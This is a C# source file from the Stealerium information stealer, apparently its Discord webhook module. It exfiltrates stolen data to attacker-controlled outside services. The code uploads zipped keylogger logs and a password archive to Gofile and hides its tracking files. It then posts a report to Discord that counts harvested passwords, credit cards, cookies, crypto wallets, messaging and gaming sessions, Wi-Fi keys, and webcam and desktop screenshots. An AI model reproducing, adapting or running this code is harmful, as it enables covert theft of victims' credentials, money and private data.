using System;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using Newtonsoft.Json.Linq;
using Stealerium.Helpers;
using Stealerium.Modules.Implant;
using Stealerium.Target.System;

namespace Stealerium
{
    internal sealed class DiscordWebHook
    {
        private const int MaxKeylogs = 10;

        // Message id location
        private static readonly string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");

        // Keylogs history file
        private static readonly string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");

        // Save latest message id to file
        public static void SetLatestMessageId(string id)
        {
            try
            {
                File.WriteAllText(LatestMessageIdLocation, id);
                Startup.SetFileCreationDate(LatestMessageIdLocation);
                Startup.HideFile(LatestMessageIdLocation);
            }
            catch (Exception ex)
            {
                Logging.Log("SaveID: \n" + ex);
            }
        }

        // Get latest message id from file
        public static string GetLatestMessageId()
        {
            return File.Exists(LatestMessageIdLocation) ? File.ReadAllText(LatestMessageIdLocation) : "-1";
        }

        private static string GetMessageId(string response)
        {
            var jObject = JObject.Parse(response);
            var id = jObject["id"].Value<string>();
            return id;
        }

        public static bool WebhookIsValid()
        {
            try
            {
                using (var client = new WebClient())
                {
                    var response = client.DownloadString(
                        Config.Webhook
                    );
                    return response.StartsWith("{\"type\": 1");
                }
            }
            catch (Exception error)
            {
                Logging.Log("Discord >> Invalid Webhook:\n" + error);
            }

            return false;
        }

        /// <summary>
        ///     Send message to discord channel
        /// </summary>
        /// <param name="text">Message text</param>
        public static string SendMessage(string text)
        {
            try
            {
                var discordValues = new NameValueCollection();

                using (var client = new WebClient())
                {
                    discordValues.Add("username", Config.Username);
                    discordValues.Add("avatar_url", Config.Avatar);
                    discordValues.Add("content", text);
                    var response = client.UploadValues(Config.Webhook + "?wait=true", discordValues);
                    return GetMessageId(Encoding.UTF8.GetString(response));
                }
            }
            catch (Exception error)
            {
                Logging.Log("Discord >> SendMessage exception:\n" + error);
            }

            return "0";
        }

        /// <summary>
        ///     Edit message text in discord channel
        /// </summary>
        /// <param name="text">New text</param>
        /// <param name="id">Message ID</param>
        public static void EditMessage(string text, string id)
        {
            try
            {
                var discordValues = new NameValueCollection();

                using (var client = new WebClient())
                {
                    discordValues.Add("username", Config.Username);
                    discordValues.Add("avatar_url", Config.Avatar);
                    discordValues.Add("content", text);
                    client.UploadValues(Config.Webhook + "/messages/" + id, "PATCH", discordValues);
                }
            }
            catch
            {
                // ignored
            }
        }


        /// <summary>
        ///     Upload keylogs to anonfile
        /// </summary>
        private static void UploadKeylogs()
        {
            var log = Path.Combine(Paths.InitWorkDir(), "logs");
            if (!Directory.Exists(log)) return;
            var filename = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
            var archive = Filemanager.CreateArchive(log, false);
            File.Move(archive, filename + ".zip");
            var url = GofileFileService.UploadFile(filename + ".zip");
            File.Delete(filename + ".zip");
            File.AppendAllText(KeylogsHistory, "\t\t\t\t\t\t\t- " +
                                               $"[{filename.Replace("_", " ").Replace(".", ":")}]({url})\n");
            Startup.HideFile(KeylogsHistory);
        }

        /// <summary>
        ///     Get string with keylogs history
        /// </summary>
        /// <returns></returns>
        private static string GetKeylogsHistory()
        {
            if (!File.Exists(KeylogsHistory))
                return "";

            var logs = File.ReadAllLines(KeylogsHistory)
                .Reverse().Take(MaxKeylogs).Reverse().ToList();
            var len = logs.Count == 10 ? $"({logs.Count} - MAX)" : $"({logs.Count})";
            var data = string.Join("\n", logs);
            return $"\n\n  ⌨️ *Keylogger {len}:*\n" + data;
        }

        /// <summary>
        ///     Format system information for sending to telegram bot
        /// </summary>
        /// <returns>String with formatted system information</returns>
        private static void SendSystemInfo(string url)
        {
            UploadKeylogs();

            // Get info
            var info = "```"
                       + "\n😹 *Stealerium - Report:*"
                       + "\nDate: " + SystemInfo.Datenow
                       + "\nSystem: " + SystemInfo.GetSystemVersion()
                       + "\nUsername: " + SystemInfo.Username
                       + "\nCompName: " + SystemInfo.Compname
                       + "\nLanguage: " + Flags.GetFlag(SystemInfo.Culture.Split('-')[1]) + " " + SystemInfo.Culture
                       + "\nAntivirus: " + SystemInfo.GetAntivirus()
                       + "\n"
                       + "\n💻 *Hardware:*"
                       + "\nCPU: " + SystemInfo.GetCpuName()
                       + "\nGPU: " + SystemInfo.GetGpuName()
                       + "\nRAM: " + SystemInfo.GetRamAmount()
                       + "\nPower: " + SystemInfo.GetBattery()
                       + "\nScreen: " + SystemInfo.ScreenMetrics()
                       + "\nWebcams count: " + WebcamScreenshot.GetConnectedCamerasCount()
                       + "\n"
                       + "\n📡 *Network:* "
                       + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                       + "\nInternal IP: " + SystemInfo.GetLocalIp()
                       + "\nExternal IP: " + SystemInfo.GetPublicIp()
                       + "\n" + SystemInfo.GetLocation()
                       + "\n"
                       + "\n💸 *Domains info:*"
                       + Counter.GetLValue("🏦 *Banking services*", Counter.DetectedBankingServices, '-')
                       + Counter.GetLValue("💰 *Cryptocurrency services*", Counter.DetectedCryptoServices, '-')
                       + Counter.GetLValue("🎨 *Social networks*", Counter.DetectedSocialServices, '-')
                       + Counter.GetLValue("🍓 *Porn websites*", Counter.DetectedPornServices, '-')
                       + GetKeylogsHistory()
                       + "\n"
                       + "\n🌐 *Browsers:*"
                       + Counter.GetIValue("🔑 Passwords", Counter.Passwords)
                       + Counter.GetIValue("💳 CreditCards", Counter.CreditCards)
                       + Counter.GetIValue("🍪 Cookies", Counter.Cookies)
                       + Counter.GetIValue("📂 AutoFill", Counter.AutoFill)
                       + Counter.GetIValue("⏳ History", Counter.History)
                       + Counter.GetIValue("🔖 Bookmarks", Counter.Bookmarks)
                       + Counter.GetIValue("📦 Downloads", Counter.Downloads)
                       + Counter.GetIValue("💰 Wallet Extensions", Counter.BrowserWallets)
                       + "\n"
                       + "\n🗃 *Software:*"
                       + Counter.GetIValue("💰 Wallets", Counter.Wallets)
                       + Counter.GetIValue("📡 FTP hosts", Counter.FtpHosts)
                       + Counter.GetIValue("🔌 VPN accounts", Counter.Vpn)
                       + Counter.GetIValue("🦢 Pidgin accounts", Counter.Pidgin)
                       + Counter.GetSValue("📫 Outlook accounts", Counter.Outlook)
                       + Counter.GetSValue("✈️ Telegram sessions", Counter.Telegram)
                       + Counter.GetSValue("☁️ Skype session", Counter.Skype)
                       + Counter.GetSValue("👾 Discord token", Counter.Discord)
                       + Counter.GetSValue("💬 Element session", Counter.Element)
                       + Counter.GetSValue("💭 Signal session", Counter.Signal)
                       + Counter.GetSValue("🔓 Tox session", Counter.Tox)
                       + Counter.GetSValue("🎮 Steam session", Counter.Steam)
                       + Counter.GetSValue("🎮 Uplay session", Counter.Uplay)
                       + Counter.GetSValue("🎮 BattleNET session", Counter.BattleNet)
                       + "\n"
                       + "\n🧭 *Device:*"
                       + Counter.GetSValue("🗝 Windows product key", Counter.ProductKey)
                       + Counter.GetIValue("🛰 Wifi networks", Counter.SavedWifiNetworks)
                       + Counter.GetSValue("📸 Webcam screenshot", Counter.WebcamScreenshot)
                       + Counter.GetSValue("🌃 Desktop screenshot", Counter.DesktopScreenshot)
                       + "\n"
                       + "\n🦠 *Installation:*"
                       + Counter.GetBValue(Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices),
                           "✅ Startup installed", "⛔️ Startup disabled")
                       + Counter.GetBValue(
                           Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1",
                           "✅ Clipper installed", "⛔️ Clipper not installed")
                       + Counter.GetBValue(
                           Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1",
                           "✅ Keylogger installed", "⛔️ Keylogger not installed")
                       + "\n"
                       + "\n📄 *File Grabber:*" +
                       (Config.GrabberModule != "1" ? "\n   ∟ ⛔️ Disabled in configuration" : "")
                       + Counter.GetIValue("📂 Images", Counter.GrabberImages)
                       + Counter.GetIValue("📂 Documents", Counter.GrabberDocuments)
                       + Counter.GetIValue("📂 Database files", Counter.GrabberDatabases)
                       + Counter.GetIValue("📂 Source code files", Counter.GrabberSourceCodes)
                       + "\n"
                       + $"\n🔗 [Archive download link]({url})"
                       + "\n🔐 Archive password is: \"" + StringsCrypt.ArchivePassword + "\""
                       + "```";

            var last = GetLatestMessageId();
            if (last != "-1")
                EditMessage(info, last);
            else
                SetLatestMessageId(SendMessage(info));
        }

        public static void SendReport(string file)
        {
            Logging.Log("Sending passwords archive to Gofile");
            var url = GofileFileService.UploadFile(file);
            File.Delete(file);
            Logging.Log("Sending report to discord");
            SendSystemInfo(url);
            Logging.Log("Report sent to discord");
        }
    }
}